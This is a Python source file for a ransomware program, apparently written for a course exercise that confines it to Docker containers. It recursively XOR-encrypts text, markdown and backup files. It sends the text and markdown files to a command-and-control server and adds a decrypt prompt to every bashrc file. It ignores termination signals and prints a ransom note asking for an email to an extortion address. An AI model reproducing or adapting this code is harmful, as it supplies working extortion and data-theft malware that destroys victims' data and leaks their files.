import logging
import socket
import re
import sys
import subprocess
from signal import signal, SIGTERM, SIGINT, SIG_IGN

from os import system
from pathlib import Path
from secret_manager import SecretManager
from ascii_wonders import *

CNC_ADDRESS = "cnc:6666"
INSTALL_PATH = "/root/ransomware"

# definition of a function used to initialise the code. This function sets the signals SIGTERM and SIGINT to be ignored so that the app cannot be closed
def lock_terminal():
    signal(SIGINT, SIG_IGN)
    signal(SIGTERM, SIG_IGN)

class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
        self._log = logging.getLogger(self.__class__.__name__)
        self._secret_manager = SecretManager(CNC_ADDRESS)

    def check_hostname_is_docker(self) -> None:
        # At first, we check if we are in a docker
        # to prevent running Veilleuxthis program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str) -> list:
        # return all files matching the filter
        """files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
        The paths are stored as strings."""
        
        # file_list is the list containing he paths of the files contained in the whole fs tree, corresponding to a certain filter
        # Path().rglob() searches through the fs tree recursively according to the filter. For each file found, we append its path as a string to a list
        # this list is then passed in file_list
        file_list = [str(p) for p in list(Path().rglob(filter))]
        
        # optional debug message of file_list
        self._log.debug(file_list)
        return file_list

    def encrypt(self) -> None:
        # main function for encrypting (see PDF)
        self._log.debug("PASSING THROUGH encrypt() FUNCTION!!!!")
        
        # calling a function that adds a line to all found *bashrc* scripts on the machine
        # everytime they start a terminal, the users have to dealt with the "please enter key" prompt
        self.add_reminder_to_bashrc(INSTALL_PATH)
        
        # looking for files to encrypt - these files are all *.txt, *.md ans *.bak
        files_to_encrypt = []
        files_to_encrypt.extend(self.get_files("*.txt"))
        files_to_encrypt.extend(self.get_files("*.md"))
        # we plan to leak files but the *.bak are not interesting, here
        files_to_leak = files_to_encrypt.copy()
        files_to_encrypt.extend(self.get_files("*.bak"))

        self._log.debug(files_to_encrypt)

        # calling secret manager setup, detailed in another file
        self._secret_manager.setup()
        # calculating xor encryption on every file
        self._secret_manager.xorfiles(files_to_encrypt)
        
        # leaking files by sending them to the CNC
        self._secret_manager.leak_files(files_to_leak)
        
        # getting the token as a hex number
        token = self._secret_manager.get_hex_token()

        # printing some fun text to sooth the freshly-pwned user
        print(OH_NO)
        print(f"Your txt files have been encrypted (and stolen, of course)! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
        print(HERE_WIPE_YOUR_TEARS)
        print(ASCII_TISSUE_BOX)
        return None
    
    def add_reminder_to_bashrc(self, path: str) -> None:
        # function to add a line to all found bashrc files
        for bashrc in self.get_files("*bashrc*"):
            self._log.debug(bashrc)
            # for reputation purposes, we can backup the bashrc files to recover them later on (they will be encrypted anyways)
            # os.system allows us to type bash commands into the terminal
            system(f"cp {bashrc} {bashrc}.bak")

            # appending the line `python root/ransomware/ransomware.py --decrypt` to bashrc
            system(f"echo 'python {path}/ransomware.py --decrypt' >> {bashrc}")
        return None

    def decrypt(self) -> bool:
        # main function for decrypting
        self._log.debug("PASSING THROUGH decrypt() FUNCTION!!!!")

        # loading the locally saved crypto data
        self._secret_manager.load()

        # asking the user for a candidate key
        candidate_key = input("\rPlease enter your cryptographic key: ")
    
        # asking again until the provided key is valid
        while not self._secret_manager.set_key(candidate_key):
            print("The key you have entered is incorrect.")
            candidate_key = input("\nPlease enter the correct cryptographic key: ")

        # finding all files to be decrypted
        files_to_decrypt = []
        files_to_decrypt.extend(self.get_files("*.txt"))
        files_to_decrypt.extend(self.get_files("*.bak"))
        files_to_decrypt.extend(self.get_files("*.md"))
        
        # XORing files again
        self._secret_manager.xorfiles(files_to_decrypt)

        # removing the crypto data that we have created
        self._secret_manager.clean(INSTALL_PATH)
        # printing a nice message
        print("\rOkay, your data has been restored to its former state. Have a nice day :)")
        
        # restoring the bashrc files
        for bashrc_bak in self.get_files("*bashrc.bak"):
            system(f"cp {bashrc_bak} {bashrc_bak[0:-4]}")

        # returning True to help stop the program once the decryption is over
        return True


if __name__ == "__main__":
    # calling our pre-exec function to lock the terminal
    lock_terminal()

    # enabling different levels of verbosity
    if "--verbose" in sys.argv:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    # creating the ransomware
    ransomware = Ransomware()
    # decryption and encryption scenarios - I hate stepped nested statements but could figure out a better way of managing these calls...
    if not "--decrypt" in sys.argv:
        ransomware.encrypt()
        done = False
        # prevent the Ctrl + D macro from interrupting the program
        while not done:
            try:
                done = ransomware.decrypt()
            except EOFError:
                print("\n")
                continue

    if "--decrypt" in sys.argv:
        ransomware.decrypt()
